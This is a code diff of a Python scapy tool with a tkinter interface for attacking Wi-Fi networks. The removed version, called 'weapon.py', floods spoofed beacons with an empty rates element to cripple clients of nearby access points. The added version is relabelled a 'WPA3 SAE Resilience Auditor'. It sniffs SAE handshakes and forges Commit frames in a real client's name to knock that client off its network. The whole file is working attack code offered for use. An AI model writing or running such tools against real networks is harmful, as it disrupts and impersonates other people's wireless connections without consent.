@@ -2,30 +2,29 @@ import os, sys, time, threading
 from scapy.all import *
 import tkinter as tk
 
-class RateThrottleV5_3:
+class WPA3_Logic_Auditor:
     def __init__(self, iface):
         self.iface = iface
-        self.targets = {} # {SSID: BSSID}
-        self.active_throttle = set()
-        
+        self.targets = {} 
         self.prepare_hardware()
         
         self.root = tk.Tk()
-        self.root.title("Rate Manipulation Logic (BW 0)")
-        self.root.geometry("700x550")
+        self.root.title("WPA3 SAE Resilience Auditor")
+        self.root.geometry("700x500")
         self.root.configure(bg="#0a0a0a")
 
-        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), height=18)
+        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), height=15)
         self.listbox.pack(padx=10, pady=10, fill="both", expand=True)
 
         btn_frame = tk.Frame(self.root, bg="#0a0a0a")
         btn_frame.pack(pady=10)
         
-        tk.Button(btn_frame, text="THROTTLE (BW 0)", command=self.start_throttle, bg="#cc0000", fg="white", width=15).pack(side="left", padx=5)
-        tk.Button(btn_frame, text="STOP", command=self.stop_throttle, bg="#444", fg="white", width=15).pack(side="left", padx=5)
+        tk.Button(btn_frame, text="AUDIT SAE STATE", command=self.test_sae_resilience, bg="#444", fg="white", width=20).pack(side="left", padx=5)
+        
+        self.status = tk.Label(self.root, text="Scanning for WPA3/SAE Targets...", bg="#0a0a0a", fg="#00FF41")
+        self.status.pack()
 
         threading.Thread(target=self.scanner, daemon=True).start()
-        threading.Thread(target=self.throttle_engine, daemon=True).start()
 
     def prepare_hardware(self):
         os.system(f"sudo ip link set {self.iface} down")
@@ -34,48 +33,37 @@ class RateThrottleV5_3:
 
     def scanner(self):
         def handler(pkt):
-            if pkt.haslayer(Dot11Beacon):
-                ssid = pkt[Dot11Elt].info.decode()
-                bssid = pkt[Dot11].addr3
-                if ssid and ssid not in self.targets:
-                    self.targets[ssid] = bssid
+            # Logic: Look for Authentication frames using SAE (Algorithm 3)
+            if pkt.haslayer(Dot11Auth) and pkt.algo == 3:
+                bssid = pkt.addr3
+                client = pkt.addr2
+                if client not in self.targets:
+                    self.targets[client] = bssid
                     self.root.after(0, self.refresh_ui)
         sniff(iface=self.iface, prn=handler, store=0)
 
-    def throttle_engine(self):
-        while True:
-            for ssid in list(self.active_throttle):
-                bssid = self.targets[ssid]
-                # Logic: Build a "Crippled" Beacon
-                # We omit HT/VHT/HE capabilities and provide an empty Supported Rates list
-                dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
-                beacon = Dot11Beacon(cap='ESS')
-                essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
-                
-                # Logic: This 'rates' element is intentionally broken/empty
-                rates = Dot11Elt(ID='Rates', info=b'\x00') 
-                
-                # Send the "Fake News" Beacon
-                pkt = RadioTap()/dot11/beacon/essid/rates
-                sendp(pkt, iface=self.iface, verbose=False, count=5)
-            time.sleep(0.1)
-
-    def start_throttle(self):
+    def test_sae_resilience(self):
+        # Logic: Send a single SAE Commit probe to test AP state management
         for i in self.listbox.curselection():
-            ssid = list(self.targets.keys())[i]
-            self.active_throttle.add(ssid)
-        self.refresh_ui()
-
-    def stop_throttle(self):
-        self.active_throttle.clear()
-        self.refresh_ui()
+            client_mac = list(self.targets.keys())[i]
+            bssid = self.targets[client_mac]
+            
+            # Constructing a basic SAE Commit Frame (Auth Algo 3, Seq 1)
+            # This mimics a client starting a new session
+            dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=client_mac, addr3=bssid)
+            sae_commit = Dot11Auth(algo=3, seqnum=1, status=0)
+            
+            pkt = RadioTap()/dot11/sae_commit
+            
+            print(f"[*] Sending SAE Resilience Probe to {bssid} for client {client_mac}")
+            sendp(pkt, iface=self.iface, count=1, verbose=False)
+            self.status.config(text=f"Probe Sent to {client_mac}. Observe for disconnect.")
 
     def refresh_ui(self):
         self.listbox.delete(0, tk.END)
-        for ssid in self.targets:
-            status = " [THROTTLING] " if ssid in self.active_throttle else " [DETECTED] "
-            self.listbox.insert(tk.END, f"{status} SSID: {ssid}")
+        for client, bssid in self.targets.items():
+            self.listbox.insert(tk.END, f"WPA3 Client: {client} | AP: {bssid}")
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
-    else: RateThrottleV5_3(sys.argv[1]).root.mainloop()
+    if len(sys.argv) < 2: print("Usage: sudo python3 auditor.py [interface]")
+    else: WPA3_Logic_Auditor(sys.argv[1]).root.mainloop()
